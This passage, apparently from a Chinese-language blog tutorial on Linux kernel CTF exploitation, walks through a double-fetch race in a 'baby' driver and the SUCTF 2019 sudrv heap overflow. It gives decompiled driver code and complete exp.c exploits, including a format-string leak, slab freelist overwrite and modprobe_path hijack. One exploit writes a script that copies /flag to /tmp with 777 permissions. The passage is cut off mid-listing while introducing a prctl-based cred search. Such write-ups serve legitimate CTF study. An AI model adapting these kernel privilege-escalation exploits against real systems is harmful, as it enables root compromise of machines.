<p>ioctl主要有两个功能,cmd=0x6666的时候输出flag的地址到dmesg里，cmd=0x1337的时候开始进行校验。检查的内容是指针是否是用户态空间数据，指针内部的flag_str指针是否是用户态数据，非用户态的话会直接返回，第三个检查是flag_str的长度是否和flag长度一致，我们这里利用double fetch的漏洞，先从dmesg里得到flag的地址，之后构造恶意线程不断往用户态的一个数据指针里修改flag_str为内核flag地址，这样在经过三次校验之后有一定几率在校验flag字节前把flag_str改为实际flag地址，之后即可输出flag。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">baby_ioctl</span><span class="params">(__int64 a1, __int64 arg1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 arg2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp-5Ch] [rbp-5Ch]</span></span><br><span class="line">  __int64 arg22; <span class="comment">// [rsp-58h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, arg1);</span><br><span class="line">  arg22 = arg2;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)arg1 == <span class="number">0x6666</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">"Your flag is at %px! But I don't think you know it's content\n"</span>, flag);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)arg1 == <span class="number">0x1337</span></span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(arg2, <span class="number">16L</span>L, *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">0x1358</span>))</span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(</span><br><span class="line">               *(_QWORD *)arg22,</span><br><span class="line">               *(<span class="keyword">signed</span> <span class="keyword">int</span> *)(arg22 + <span class="number">8</span>),</span><br><span class="line">               *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">0x1358</span>))</span><br><span class="line">         &amp;&amp; *(_DWORD *)(arg22 + <span class="number">8</span>) == <span class="built_in">strlen</span>(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)arg22 + i) != flag[i] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">22L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">"Looks like the flag is not a secret anymore. So here is it %s\n"</span>, flag);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">14L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="exp-c-2"><a href="#exp-c-2" class="headerlink" title="exp.c"></a>exp.c</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attr</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* flag;</span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> is_finished = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> buf[LEN+<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> flag_addr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_attr</span><span class="params">(<span class="keyword">void</span>* s)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span>* <span class="title">s1</span> = <span class="title">s</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(!is_finished)</span><br><span class="line">        s1-&gt;flag = flag_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//leak flag address from dmesg</span></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/baby"</span>,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6666</span>);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    system(<span class="string">"dmesg &gt; /tmp/record.txt"</span>);</span><br><span class="line">    <span class="keyword">int</span> dmesg_fd = open(<span class="string">"/tmp/record.txt"</span>,O_RDONLY);</span><br><span class="line">    lseek(dmesg_fd,<span class="number">-0x1000</span>,SEEK_END);</span><br><span class="line">    read(dmesg_fd,buf,LEN);</span><br><span class="line">    close(dmesg_fd);</span><br><span class="line">    <span class="keyword">char</span>* pos = <span class="built_in">strstr</span>(buf,<span class="string">"Your flag is at "</span>);</span><br><span class="line">    <span class="keyword">if</span>(pos == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Not found\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        pos += <span class="number">0x10</span>;</span><br><span class="line">    flag_addr = strtoull(pos,pos+<span class="number">0x10</span>,<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]flag addr:%p"</span>,flag_addr);</span><br><span class="line">    <span class="comment">//create threads</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> <span class="title">t</span>;</span></span><br><span class="line">    t.flag = buf;</span><br><span class="line">    t.len = <span class="number">33</span>;</span><br><span class="line">    <span class="keyword">pthread_t</span> t1;</span><br><span class="line">    pthread_create(&amp;t1,<span class="literal">NULL</span>,change_attr,&amp;t);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">        ioctl(fd,<span class="number">0x1337</span>,&amp;t);</span><br><span class="line">        t.flag = buf;</span><br><span class="line">    &#125;</span><br><span class="line">    is_finished = <span class="number">1</span>;</span><br><span class="line">    pthread_join(t1,<span class="literal">NULL</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*]result:\n"</span>);</span><br><span class="line">    system(<span class="string">"dmesg | grep flag"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Heap-Overflow"><a href="#Heap-Overflow" class="headerlink" title="Heap Overflow"></a>Heap Overflow</h2><h3 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h3><p>之前介绍的大部分都是栈的内容，内核堆漏洞也是蛮多的，最简单的莫过于堆溢出，因为slab的分配类似fastbin，我们可以通过溢出覆盖下一个free_chunk的fd两次分配到任意地址。</p>
<h3 id="SUCTF-2019-sudrv"><a href="#SUCTF-2019-sudrv" class="headerlink" title="SUCTF 2019 sudrv"></a>SUCTF 2019 sudrv</h3><h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>ioctl给了仨功能，分别是分配、释放和输出堆块内容，其中<code>sudrv_ioctl_cold_2</code>函数有格式化字符串漏洞，可以通过<code>%llx</code>泄露栈上的内容，进而从dmesg里获取泄露的函数相关地址以及栈地址，通过堆溢出(write未检查buf和size)我们可以分配到堆到栈上进行溢出写<code>rop</code>。</p>
<p>除此之外，我们还可以通过劫持<code>modprobe_path</code>不起root shell但是可以以root身份执行任意命令，比如把flag拷贝到/tmp目录下并给777权限之后查看。这个原理是内核在运行异常的时候会调用modprobe_path指向的文件，我们改成自己编写的getflag.sh即可，执行完exp之后手动取执行/tmp/ll(一个格式错误的可执行文件)即可触发读取flag。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sudrv_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> cmd, __int64 arg2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x73311337</span>:</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(arg2 - <span class="number">1</span>) &gt; <span class="number">0xFFE</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      su_buf = (<span class="keyword">char</span> *)_kmalloc(arg2, <span class="number">0x480020</span>LL);<span class="comment">// add</span></span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> (<span class="keyword">int</span>)<span class="number">0xDEADBEEF</span>:</span><br><span class="line">      JUMPOUT(su_buf, <span class="number">0L</span>L, sudrv_ioctl_cold_2); <span class="comment">// format string leak address</span></span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x13377331</span>:</span><br><span class="line">      kfree(su_buf);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">      su_buf = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">sudrv_ioctl_cold_2</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(a1);</span><br><span class="line">  JUMPOUT(&amp;loc_38);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意在这里的modprobe_path在/proc/kallsyms里没有符号，我们可以通过引用找到它<a href="https://www.anquanke.com/post/id/185911#h3-2" target="_blank" rel="noopener">参考</a>，先找到<code>__request_module</code>函数，在gdb里查看函数汇编即可找到<code>modprobe_path</code>。在这里未开kalsr的时候是<code>0xffffffff82242320</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /proc/kallsyms | grep __request</span><br><span class="line">ffffffff81065210 t __request_resource</span><br><span class="line">ffffffff81065d60 T __request_region</span><br><span class="line">ffffffff810833e0 T __request_module</span><br><span class="line">ffffffff8108378b t __request_module.cold.4</span><br><span class="line">ffffffff810b2c10 T __request_percpu_irq</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/28i 0xffffffff810833e0                                </span><br><span class="line">   0xffffffff810833e0:  push   rbp</span><br><span class="line">   0xffffffff810833e1:  mov    rbp,rsp</span><br><span class="line">   0xffffffff810833e4:  push   r15</span><br><span class="line">   0xffffffff810833e6:  push   r14</span><br><span class="line">   0xffffffff810833e8:  push   r13</span><br><span class="line">   0xffffffff810833ea:  mov    r13,rsi</span><br><span class="line">   0xffffffff810833ed:  push   r12</span><br><span class="line">   0xffffffff810833ef:  movzx  r12d,dil</span><br><span class="line">   0xffffffff810833f3:  push   r10</span><br><span class="line">   0xffffffff810833f5:  lea    r10,[rbp+0x10]</span><br><span class="line">   0xffffffff810833f9:  push   rbx</span><br><span class="line">   0xffffffff810833fa:  mov    ebx,edi</span><br><span class="line">   0xffffffff810833fc:  sub    rsp,0xb8</span><br><span class="line">   0xffffffff81083403:  mov    QWORD PTR [rbp-0x50],rdx</span><br><span class="line">   0xffffffff81083407:  mov    QWORD PTR [rbp-0x48],rcx</span><br><span class="line">   0xffffffff8108340b:  mov    QWORD PTR [rbp-0x40],r8</span><br><span class="line">   0xffffffff8108340f:  mov    QWORD PTR [rbp-0x38],r9</span><br><span class="line">   0xffffffff81083413:  mov    rax,QWORD PTR gs:0x28</span><br><span class="line">   0xffffffff8108341c:  mov    QWORD PTR [rbp-0x68],rax</span><br><span class="line">   0xffffffff81083420:  xor    eax,eax</span><br><span class="line">   0xffffffff81083422:  test   dil,dil</span><br><span class="line">   0xffffffff81083425:  jne    0xffffffff810835a6</span><br><span class="line">   0xffffffff8108342b:  xor    r15d,r15d</span><br><span class="line">   0xffffffff8108342e:  cmp    BYTE PTR [rip+0x11beeeb],0x0        # 0xffffffff82242320</span><br><span class="line">   0xffffffff81083435:  jne    0xffffffff8108345e</span><br><span class="line">   0xffffffff81083437:  mov    rcx,QWORD PTR [rbp-0x68]</span><br><span class="line">   0xffffffff8108343b:  xor    rcx,QWORD PTR gs:0x28</span><br><span class="line">   0xffffffff81083444:  mov    eax,r15d</span><br><span class="line">gdb-peda$ x/s 0xffffffff82242320</span><br><span class="line">0xffffffff82242320:     &quot;/tmp/getflag.sh&quot;</span><br></pre></td></tr></table></figure></p>
<h4 id="exp-c-3"><a href="#exp-c-3" class="headerlink" title="exp.c"></a>exp.c</h4><p>exp来自17学长，在测试这个<code>fastbin</code>分配机制的时候我试了下改size，0x700、0x600和0x900均不行，最后是0x800和0x400成功，挠头.jpg，找了下也没有讲的很好的slab/slub分配机制的文章，回头再说好了。</p>
<p>使用的时候使用管道作为输入<code>printf &#39;\x20\x23\x24\x82\xff\xff\xff\xff&#39; | ./exp</code>，执行完exp之后执行/tmp/ll再<code>cat /tmp/flag</code>即可。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CREATE 0x73311337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW 0xDEADBEEF</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELETE 0x13377331</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_slab</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> size)</span> </span>&#123;</span><br><span class="line">    ioctl(fd, CREATE, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">    ioctl(fd, SHOW, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">    ioctl(fd, DELETE, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"echo -ne '#!/bin/sh\n/bin/cp /flag /tmp/flag\n/bin/chmod 777 /tmp/flag' &gt; /tmp/getflag.sh"</span>);</span><br><span class="line">    system(<span class="string">"chmod +x /tmp/getflag.sh"</span>);</span><br><span class="line">    system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /tmp/ll"</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/meizijiutql"</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">'a'</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    create_slab(fd, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    write(fd, buf, <span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">    show(fd);</span><br><span class="line">    show(fd);</span><br><span class="line">    show(fd);</span><br><span class="line">    show(fd);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *modprobe_addr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    create_slab(fd, <span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">    memset(modprobe_addr, '\x00', 0x10);</span><br><span class="line">    memset(buf, '\x00', 0x1000);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">'a'</span>, <span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input modprobe_addr:"</span>);</span><br><span class="line"></span><br><span class="line">    read(<span class="number">0</span>, modprobe_addr, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcat</span>(buf, modprobe_addr);</span><br><span class="line"></span><br><span class="line">    write(fd, buf, <span class="number">0x408</span>);</span><br><span class="line"></span><br><span class="line">    create_slab(fd, <span class="number">0x400</span>);</span><br><span class="line">    write(fd, <span class="string">"/tmp/getflag.sh\x00"</span>, <span class="number">17</span>);</span><br><span class="line">    create_slab(fd, <span class="number">0x400</span>);</span><br><span class="line">    write(fd, <span class="string">"/tmp/getflag.sh\x00"</span>, <span class="number">17</span>);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="prctl爆破cred地址"><a href="#prctl爆破cred地址" class="headerlink" title="prctl爆破cred地址"></a>prctl爆破cred地址</h2><h3 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h3><p>是p4nda师傅介绍的三种<a href="http://p4nda.top/2018/11/07/stringipc/#EXP" target="_blank" rel="noopener">权限提升思路</a>，第一种也是最简单的思路就是直接修改cred结构体对应标识权限的数据为0，这里用到了一个leak cred地址的方式，首先我们要知道一些基础知识。每个线程在内核中都对应一个线程栈，一个thread_info结构体，这个结构体如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>	*<span class="title">task</span>;</span>		<span class="comment">/* main task structure */</span></span><br><span class="line">	__u32			flags;		<span class="comment">/* low level flags */</span></span><br><span class="line">	__u32			status;		<span class="comment">/* thread synchronous flags */</span></span><br><span class="line">	__u32			cpu;		<span class="comment">/* current CPU */</span></span><br><span class="line">	<span class="keyword">mm_segment_t</span>		addr_limit;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		sig_on_uaccess_error:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		uaccess_err:<span class="number">1</span>;	<span class="comment">/* uaccess failed */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>在这个结构体中cred结构体用以标识线程的权限，在cred结构体后8字节的位置有一个字符数组<code>char comm[TASK_COMM_LEN];</code>用来表示进程名(<code>不超过16字节</code>)，我们可以用<code>prctl</code>设置它的内容之后用任意读穷举搜索其位置，进而定位到cred地址，之后结合任意写改其内容即可。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 